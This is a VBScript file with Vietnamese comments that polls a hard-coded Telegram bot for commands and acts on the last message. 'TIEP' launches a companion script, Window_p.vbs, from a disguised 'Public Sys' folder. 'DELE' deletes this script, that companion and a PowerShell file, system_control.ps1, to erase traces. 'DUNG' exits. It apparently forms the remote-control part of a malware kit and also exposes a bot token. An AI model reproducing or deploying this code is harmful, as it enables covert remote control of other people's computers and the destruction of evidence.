Option Explicit
On Error Resume Next


Dim botToken, chatId, apiUrl, xmlhttp

' Thay đổi các giá trị sau theo thông tin của bot của bạn
botToken = "7172346253:AAFA5umBz4nIwIXDXUd8ksJMmzkW5HWgViw"
chatId = "7250748991"

' Tạo URL cho API của Telegram
apiUrl = "https://api.telegram.org/bot" & botToken & "/getUpdates?offset=-1"

' Tạo đối tượng XMLHTTP để gửi yêu cầu đến API của Telegram
Set xmlhttp = CreateObject("MSXML2.XMLHTTP")

' Gửi yêu cầu GET đến API của Telegram
xmlhttp.Open "GET", apiUrl, False
xmlhttp.Send

' Kiểm tra phản hồi từ API và hiển thị dữ liệu JSON
If xmlhttp.Status = 200 Then
    Dim response
    response = xmlhttp.responseText
    Dim lastMessage
    
    ' Lấy thông điệp cuối cùng trong phản hồi
    lastMessage = Right(response, Len(response) - InStrRev(response, """text"":""") - 7)
    lastMessage = Left(lastMessage, InStr(lastMessage, """") - 1)

    If StrComp(Left(lastMessage, 4), "DELE", vbTextCompare) = 0 Then
        Dim objFSO
        Set objFSO = CreateObject("Scripting.FileSystemObject")

        ' Lấy đường dẫn tuyệt đối của file đang chạy
        Dim strScriptPath
        strScriptPath = WScript.ScriptFullName

        ' Xóa file chính
        objFSO.DeleteFile strScriptPath
        
        ' Xóa file Window_d.vbs
        Dim scriptToDelete
        scriptToDelete = "C:\Users\Public\Public Sys\Window_p.vbs"
        If objFSO.FileExists(scriptToDelete) Then
            objFSO.DeleteFile scriptToDelete
        End If
	
        scriptToDelete = "C:\Users\Public\Public Sys\system_control.ps1"
        If objFSO.FileExists(scriptToDelete) Then
            objFSO.DeleteFile scriptToDelete
        End If
        
        Set objFSO = Nothing
    ElseIf StrComp(Left(lastMessage, 4), "TIEP", vbTextCompare) = 0 Then
        ' Nếu tin nhắn là "TIEP", chạy file Window_d.vbs
	Dim shell
	Set shell = CreateObject("WScript.Shell")
	shell.Run """C:\Users\Public\Public Sys\Window_p.vbs""", 1, False
	Set shell = Nothing

    ElseIf StrComp(Left(lastMessage, 4), "DUNG", vbTextCompare) = 0 Then
        ' Nếu tin nhắn là "DUNG", lập tức thoát
        WScript.Quit
    End If

End If
